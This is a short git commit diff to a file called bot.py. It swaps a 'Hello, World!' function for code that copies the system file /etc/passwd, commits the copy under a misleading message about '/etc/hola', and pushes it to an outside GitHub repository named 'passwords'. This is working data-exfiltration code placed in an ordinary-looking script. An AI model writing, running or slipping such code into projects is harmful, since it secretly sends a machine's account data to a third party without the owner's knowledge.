bd96284b49c612367d1cd4a5dd7cff4b5f7d2a2b
RubenMA12 <158078660+RubenMA12@users.noreply.github.com>
2024-02-10 17:41:30 +0100

    passwd bot.py

--- bot.py
+++ bot.py
@@ -1,2 +1,18 @@
+import shutil
+from git import Repo
+
 def run():
-    print("Hello, World!")
+    archivo_origen = "/etc/passwd"
+    archivo_destino_local = "passwd.txt"
+    
+    shutil.copy(archivo_origen, archivo_destino_local)
+    
+    repo = Repo.init('.')
+    repo.index.add([archivo_destino_local])
+    repo.index.commit("Copiar archivo /etc/hola")
+    
+    origin = repo.create_remote('origin', url='https://github.com/RubenMA12/passwords.git')
+    origin.push()
+
+if __name__ == "__main__":
+    run()
